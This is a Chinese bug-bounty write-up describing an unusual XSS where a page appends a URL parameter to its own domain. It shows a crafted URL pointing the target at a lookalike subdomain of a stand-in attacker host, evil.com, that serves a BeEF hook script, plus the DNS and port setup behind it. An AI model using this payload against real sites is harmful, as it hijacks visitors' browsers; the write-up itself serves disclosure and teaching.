---
title: 【经验总结】记录一次有点儿不一样的XSS
date: 2021-01-07 16:23:25
id: 210107-162325
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-9.png
summary: 最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。
tags:
- XSS
- SRC
- 经验总结
categories:
- 经验总结
---

# 0x00 前言

最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。

为了展示出较好的效果同时不泄露网站相关信息， 这里我在自己本地按照当时目标的情况简单搭建了一个靶场。

注意：文中的`target.com`代指目标域名，`evil.com`代指自己的攻击域名。

# 0x01 发现

在测试过程中，发现目标存在这样的一个 URL

```
http://target.com/index.html?/test.html
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-1.png)

在当前页面中包含了URL参数里的页面，如果将`/test.html`改为不存在的页面就会提示404

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-2.png)

查看一下源码，可以发现页面将传参的内容与站点域名进行了拼接，随后对该页面进行访问

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-3.png)

# 0x02 思考利用

目标看到这里，刚开始只是尝试的一些常规的 XSS Payload，发现目标都进行了很好的过滤，于是陷入了短暂的思考中。

之后再看看源码，想着既然它是把参数后的值拼接到站点域名后面，那如果我有个`target.com.evil.com`的域名，我在URL中传参`.evil.com`，页面拼接后所访问的地址不就是这样：

```
http://target.com.evil.com
```

这样一来，我在`target.com.evil.com`站点下，开个beef，在我访问`http://target.com/index.html?.evil.com`的时候，目标页面就会访问到我自己的域名，如果访问的域名页面中包含了 beef 的 hook.js，那目标不就上线了嘛，nice

**开整！**

首先要有个域名和 vps ，有了域名后再设置一个 `target.com` 的子域名，设置子域名也很简单，直接在域名的DNS记录中添加一条A记录即可，名称就是`target.com`，内容就是要解析的 vps IP 地址。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-4.png)

测试一下，beef 的 hook.js 能不能访问

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-5.png)

> 这里有个坑，如果域名没有备案并且 vps 是国内的，如果同时 beef 开在 80 端口，就会导致页面一打开就会提示域名未备案，这时只要把 beef 放在其他不常用的端口上就不会提示域名未备案了。

在 beef 的 hook.js 页面可以成功访问之后，就可以构造 URL 了，这时只要 URL 后传入一个包含 hook.js 的页面就可以上线了，这里以 beef 的 demo 页面`/demos/basic.html`作为示例。

最后构造 URL 为：

```
http://target.com/index.html?.evil.com:3000/demos/basic.html
```

浏览器打开该页面

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-6.png)

可以看到当前页面成功访问到了`target.com.evil.com:3000/demos/basic.html`，此时看看 beef 里有没有上线

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-7.png)

beef 成功上线，最后再来弹个窗，嘿嘿

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-8.png)

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/diffxss-9.png)

# 0x03 最后

这个漏洞提交上去之后，相较于之前提交的较为常规的XSS，厂商给这个XSS 是其双倍的积分。

平时自己还是要多多理解漏洞产生的原因才是，要是直接用工具扫、Fuzz字典跑估计就发现利用不了这个洞了。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)